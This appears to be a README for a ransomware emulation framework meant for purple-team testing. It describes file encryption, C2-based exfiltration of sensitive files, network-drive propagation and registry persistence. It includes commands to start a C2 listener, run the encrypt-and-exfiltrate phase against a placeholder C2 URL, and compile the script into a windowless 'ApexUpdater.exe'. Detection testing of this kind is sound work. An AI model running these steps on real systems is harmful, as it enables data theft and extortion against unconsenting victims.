```markdown

█████╗ ██████╗ ███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ 
██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝     ██╔══██╗██╔══██╗██╔═══██╗
███████║██████╔╝█████╗   ╚███╔╝      ██████╔╝██████╔╝██║   ██║
██╔══██║██╔═══╝ ██╔══╝   ██╔██╗      ██╔═══╝ ██╔══██╗██║   ██║
██║  ██║██║     ███████╗██╔╝ ██╗     ██║     ██║  ██║╚██████╔╝
╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝ ╚═════╝ 

```


       ⚡ APEX PRO: RANSOMWARE EMULATION FRAMEWORK
     [ ADVERSARY EMULATION & PURPLE TEAM FRAMEWORK ]



1. Project Overview

---


Apex Pro is a high-fidelity adversary emulation tool designed to 
replicate the behaviors of modern ransomware families (e.g., LockBit, 
Conti). It provides a safe, controlled environment to validate 
detection pipelines, EDR efficacy, and Incident Response (IR) readiness.



2. Features & Architecture

---


* Cryptography: AES-256-CBC per-file encryption using native .NET providers.
* Multi-Victim C2: Asynchronous Python backend utilizing Quart and aiosqlite.
* Stealth Exfiltration: Metadata manifests are AES-encrypted locally before being tunneled through HTTPS (TLS 1.2+).
* Data Theft (T1041): Automated discovery and exfiltration of sensitive files via Base64 binary streams.
* Lateral Propagation: Automated discovery and infection of mapped SMB/Network drives (T1135).
* Persistence: Registry Run Key hijacking (T1547.001) ensuring survival across system reboots.
* Impact & UI Defacement (T1491): Wallpaper Hijack ("SYSTEM LOCKED") and distributed HTML notes.
* Canary Tripwire: Real-time C2 alerts triggered when Honey-pot files are encrypted or accessed.



3. Deployment & Execution

---


[A] Server Setup (Arch Linux)

    1. Install Dependencies:



```bash
pip install -r requirements.txt

```


    2. Generate Certificates:



```bash
openssl req -x509 -newkey rsa:4096 -keyout apex_key.pem -out apex_cert.pem -sha256 -days 365 -nodes -subj "/CN=localhost"

```


    3. Start C2 Listener:



```bash
sudo python3 c2_server.py

```


[B] Lab Preparation (Windows Client)

  Generate dummy data for the simulation:



```powershell
.\GenerateVictimData.ps1 -RootPath "C:\SimulationData"

```


[C] Simulation Execution

    Phase 1: Impact (Theft, Encryption & Exfiltration)



```powershell
.\ApexSim.ps1 -Mode Encrypt -C2Url "https://<YOUR_C2_IP>/api/v1/telemetry" -TargetPath "C:\SimulationData"

```


    Phase 2: Recovery (Decryption)



```powershell
.\ApexSim.ps1 -Mode Decrypt -TargetPath "C:\SimulationData"

```


    Optional Alternative: Agent Compilation (C# Wrapper)

      1. Encode the Script (Linux):



```bash
base64 -w 0 ApexSim.ps1 > b64_script.txt

```


      2. Compile (Windows CMD or Powershell):



```powershell
csc.exe /target:winexe /reference:System.Management.Automation.dll /out:ApexUpdater.exe ApexRunner.cs

```


[E] Reporting
    Generate a professional PDF summary of the simulation results:



```bash
python3 apex_report.py

```

4. INCIDENT RESPONSE (IR) EXERCISE TEMPLATE

---

### Simulation ID: APEX-2026-###

### Target Host: [Hostname]

| Phase | Technique | Alert Triggered? | TTD (Min) |
| --- | --- | --- | --- |
| **Persistence** | T1547.001 | [YES/NO] | [ ] |
| **Lateral Movement** | T1135 | [YES/NO] | [ ] |
| **Data Theft** | T1041 | [YES/NO] | [ ] |
| **Exfiltration** | T1011 | [YES/NO] | [ ] |
| **Canary Trip** | Honey-pot | [YES/NO] | [ ] |
| **Encryption** | T1486 | [YES/NO] | [ ] |
| **Internal Defacement** | T1491.001 | [YES/NO] | [ ] |
| **Obfuscation** | T1027 | [YES/NO] | [ ] |
| **Execution** | T1059.001 | [YES/NO] | [ ] |

📝 Note: All simulations include a standardized Incident Response (IR) Exercise Template to help Blue Teams measure MTTD.

5. RULES OF ENGAGEMENT (RoE) & SAFETY

---


1. TARGETING: Hard-code $TargetPath to an isolated sandbox.
2. NETWORKING: Use Host-Only/Internal VM networking ONLY.
3. RESTORATION: Run 'ApexSim.ps1 -Mode Decrypt' to revert changes.
4. C2 SECURITY: Use the AES shared key to secure the agent.



6. FULL DISCLAIMER

---


THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND PERMISSIONED TESTING 
PURPOSES ONLY. Unauthorized use of this tool against systems without 
prior explicit consent is illegal and unethical.

